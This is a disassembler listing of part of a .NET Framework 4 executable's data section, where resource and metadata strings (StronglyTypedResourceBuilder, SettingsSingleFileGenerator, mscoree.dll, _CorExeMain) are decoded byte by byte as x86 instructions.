  4036fd:	31 36                	xor    %esi,(%esi)
  4036ff:	2e 30 00             	xor    %al,%cs:(%eax)
  403702:	00 47 01             	add    %al,0x1(%edi)
  403705:	00 1a                	add    %bl,(%edx)
  403707:	2e 4e                	cs dec %esi
  403709:	45                   	inc    %ebp
  40370a:	54                   	push   %esp
  40370b:	46                   	inc    %esi
  40370c:	72 61                	jb     0x40376f
  40370e:	6d                   	insl   (%dx),%es:(%edi)
  40370f:	65 77 6f             	gs ja  0x403781
  403712:	72 6b                	jb     0x40377f
  403714:	2c 56                	sub    $0x56,%al
  403716:	65 72 73             	gs jb  0x40378c
  403719:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  403720:	30 01                	xor    %al,(%ecx)
  403722:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  403726:	46                   	inc    %esi
  403727:	72 61                	jb     0x40378a
  403729:	6d                   	insl   (%dx),%es:(%edi)
  40372a:	65 77 6f             	gs ja  0x40379c
  40372d:	72 6b                	jb     0x40379a
  40372f:	44                   	inc    %esp
  403730:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  403737:	61                   	popa
  403738:	6d                   	insl   (%dx),%es:(%edi)
  403739:	65 10 2e             	adc    %ch,%gs:(%esi)
  40373c:	4e                   	dec    %esi
  40373d:	45                   	inc    %ebp
  40373e:	54                   	push   %esp
  40373f:	20 46 72             	and    %al,0x72(%esi)
  403742:	61                   	popa
  403743:	6d                   	insl   (%dx),%es:(%edi)
  403744:	65 77 6f             	gs ja  0x4037b6
  403747:	72 6b                	jb     0x4037b4
  403749:	20 34 04             	and    %dh,(%esp,%eax,1)
  40374c:	01 00                	add    %eax,(%eax)
  40374e:	00 00                	add    %al,(%eax)
  403750:	41                   	inc    %ecx
  403751:	01 00                	add    %eax,(%eax)
  403753:	33 53 79             	xor    0x79(%ebx),%edx
  403756:	73 74                	jae    0x4037cc
  403758:	65 6d                	gs insl (%dx),%es:(%edi)
  40375a:	2e 52                	cs push %edx
  40375c:	65 73 6f             	gs jae 0x4037ce
  40375f:	75 72                	jne    0x4037d3
  403761:	63 65 73             	arpl   %esp,0x73(%ebp)
  403764:	2e 54                	cs push %esp
  403766:	6f                   	outsl  %ds:(%esi),(%dx)
  403767:	6f                   	outsl  %ds:(%esi),(%dx)
  403768:	6c                   	insb   (%dx),%es:(%edi)
  403769:	73 2e                	jae    0x403799
  40376b:	53                   	push   %ebx
  40376c:	74 72                	je     0x4037e0
  40376e:	6f                   	outsl  %ds:(%esi),(%dx)
  40376f:	6e                   	outsb  %ds:(%esi),(%dx)
  403770:	67 6c                	insb   (%dx),%es:(%di)
  403772:	79 54                	jns    0x4037c8
  403774:	79 70                	jns    0x4037e6
  403776:	65 64 52             	gs fs push %edx
  403779:	65 73 6f             	gs jae 0x4037eb
  40377c:	75 72                	jne    0x4037f0
  40377e:	63 65 42             	arpl   %esp,0x42(%ebp)
  403781:	75 69                	jne    0x4037ec
  403783:	6c                   	insb   (%dx),%es:(%edi)
  403784:	64 65 72 08          	fs gs jb 0x403790
  403788:	31 36                	xor    %esi,(%esi)
  40378a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40378d:	30 2e                	xor    %ch,(%esi)
  40378f:	30 00                	xor    %al,(%eax)
  403791:	00 5a 01             	add    %bl,0x1(%edx)
  403794:	00 4b 4d             	add    %cl,0x4d(%ebx)
  403797:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40379e:	74 2e                	je     0x4037ce
  4037a0:	56                   	push   %esi
  4037a1:	69 73 75 61 6c 53 74 	imul   $0x74536c61,0x75(%ebx),%esi
  4037a8:	75 64                	jne    0x40380e
  4037aa:	69 6f 2e 45 64 69 74 	imul   $0x74696445,0x2e(%edi),%ebp
  4037b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037b2:	72 73                	jb     0x403827
  4037b4:	2e 53                	cs push %ebx
  4037b6:	65 74 74             	gs je  0x40382d
  4037b9:	69 6e 67 73 44 65 73 	imul   $0x73654473,0x67(%esi),%ebp
  4037c0:	69 67 6e 65 72 2e 53 	imul   $0x532e7265,0x6e(%edi),%esp
  4037c7:	65 74 74             	gs je  0x40383e
  4037ca:	69 6e 67 73 53 69 6e 	imul   $0x6e695373,0x67(%esi),%ebp
  4037d1:	67 6c                	insb   (%dx),%es:(%di)
  4037d3:	65 46                	gs inc %esi
  4037d5:	69 6c 65 47 65 6e 65 	imul   $0x72656e65,0x47(%ebp,%eiz,2),%ebp
  4037dc:	72 
  4037dd:	61                   	popa
  4037de:	74 6f                	je     0x40384f
  4037e0:	72 09                	jb     0x4037eb
  4037e2:	31 36                	xor    %esi,(%esi)
  4037e4:	2e 31 30             	xor    %esi,%cs:(%eax)
  4037e7:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4037ea:	30 00                	xor    %al,(%eax)
  4037ec:	00 08                	add    %cl,(%eax)
  4037ee:	01 00                	add    %eax,(%eax)
  4037f0:	02 00                	add    (%eax),%al
  4037f2:	00 00                	add    %al,(%eax)
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	00 00                	add    %al,(%eax)
  4037f8:	b4 00                	mov    $0x0,%ah
  4037fa:	00 00                	add    %al,(%eax)
  4037fc:	ce                   	into
  4037fd:	ca ef be             	lret   $0xbeef
  403800:	01 00                	add    %eax,(%eax)
  403802:	00 00                	add    %al,(%eax)
  403804:	91                   	xchg   %eax,%ecx
  403805:	00 00                	add    %al,(%eax)
  403807:	00 6c 53 79          	add    %ch,0x79(%ebx,%edx,2)
  40380b:	73 74                	jae    0x403881
  40380d:	65 6d                	gs insl (%dx),%es:(%edi)
  40380f:	2e 52                	cs push %edx
  403811:	65 73 6f             	gs jae 0x403883
  403814:	75 72                	jne    0x403888
  403816:	63 65 73             	arpl   %esp,0x73(%ebp)
  403819:	2e 52                	cs push %edx
  40381b:	65 73 6f             	gs jae 0x40388d
  40381e:	75 72                	jne    0x403892
  403820:	63 65 52             	arpl   %esp,0x52(%ebp)
  403823:	65 61                	gs popa
  403825:	64 65 72 2c          	fs gs jb 0x403855
  403829:	20 6d 73             	and    %ch,0x73(%ebp)
  40382c:	63 6f 72             	arpl   %ebp,0x72(%edi)
  40382f:	6c                   	insb   (%dx),%es:(%edi)
  403830:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%edx),%esp
  403837:	73 69                	jae    0x4038a2
  403839:	6f                   	outsl  %ds:(%esi),(%dx)
  40383a:	6e                   	outsb  %ds:(%esi),(%dx)
  40383b:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  403840:	30 2e                	xor    %ch,(%esi)
  403842:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  403845:	43                   	inc    %ebx
  403846:	75 6c                	jne    0x4038b4
  403848:	74 75                	je     0x4038bf
  40384a:	72 65                	jb     0x4038b1
  40384c:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  403851:	72 61                	jb     0x4038b4
  403853:	6c                   	insb   (%dx),%es:(%edi)
  403854:	2c 20                	sub    $0x20,%al
  403856:	50                   	push   %eax
  403857:	75 62                	jne    0x4038bb
  403859:	6c                   	insb   (%dx),%es:(%edi)
  40385a:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  403861:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  403865:	62 37                	bound  %esi,(%edi)
  403867:	37                   	aaa
  403868:	61                   	popa
  403869:	35 63 35 36 31       	xor    $0x31363563,%eax
  40386e:	39 33                	cmp    %esi,(%ebx)
  403870:	34 65                	xor    $0x65,%al
  403872:	30 38                	xor    %bh,(%eax)
  403874:	39 23                	cmp    %esp,(%ebx)
  403876:	53                   	push   %ebx
  403877:	79 73                	jns    0x4038ec
  403879:	74 65                	je     0x4038e0
  40387b:	6d                   	insl   (%dx),%es:(%edi)
  40387c:	2e 52                	cs push %edx
  40387e:	65 73 6f             	gs jae 0x4038f0
  403881:	75 72                	jne    0x4038f5
  403883:	63 65 73             	arpl   %esp,0x73(%ebp)
  403886:	2e 52                	cs push %edx
  403888:	75 6e                	jne    0x4038f8
  40388a:	74 69                	je     0x4038f5
  40388c:	6d                   	insl   (%dx),%es:(%edi)
  40388d:	65 52                	gs push %edx
  40388f:	65 73 6f             	gs jae 0x403901
  403892:	75 72                	jne    0x403906
  403894:	63 65 53             	arpl   %esp,0x53(%ebp)
  403897:	65 74 02             	gs je  0x40389c
	...
  4038a2:	00 00                	add    %al,(%eax)
  4038a4:	00 50 41             	add    %dl,0x41(%eax)
  4038a7:	44                   	inc    %esp
  4038a8:	50                   	push   %eax
  4038a9:	41                   	inc    %ecx
  4038aa:	44                   	inc    %esp
  4038ab:	50                   	push   %eax
  4038ac:	b4 00                	mov    $0x0,%ah
	...
  4038ba:	00 00                	add    %al,(%eax)
  4038bc:	10 00                	adc    %al,(%eax)
	...
  4038ca:	00 00                	add    %al,(%eax)
  4038cc:	f4                   	hlt
  4038cd:	38 00                	cmp    %al,(%eax)
	...
  4038d7:	00 0e                	add    %cl,(%esi)
  4038d9:	39 00                	cmp    %eax,(%eax)
  4038db:	00 00                	add    %al,(%eax)
  4038dd:	20 00                	and    %al,(%eax)
	...
  4038f3:	00 00                	add    %al,(%eax)
  4038f5:	39 00                	cmp    %eax,(%eax)
	...
  4038ff:	00 00                	add    %al,(%eax)
  403901:	00 5f 43             	add    %bl,0x43(%edi)
  403904:	6f                   	outsl  %ds:(%esi),(%dx)
  403905:	72 45                	jb     0x40394c
  403907:	78 65                	js     0x40396e
  403909:	4d                   	dec    %ebp
  40390a:	61                   	popa
  40390b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  403912:	72 65                	jb     0x403979
  403914:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  403918:	6c                   	insb   (%dx),%es:(%edi)
  403919:	00 00                	add    %al,(%eax)
  40391b:	00 00                	add    %al,(%eax)
  40391d:	00 ff                	add    %bh,%bh
  40391f:	25 00 20 40 00       	and    $0x402000,%eax
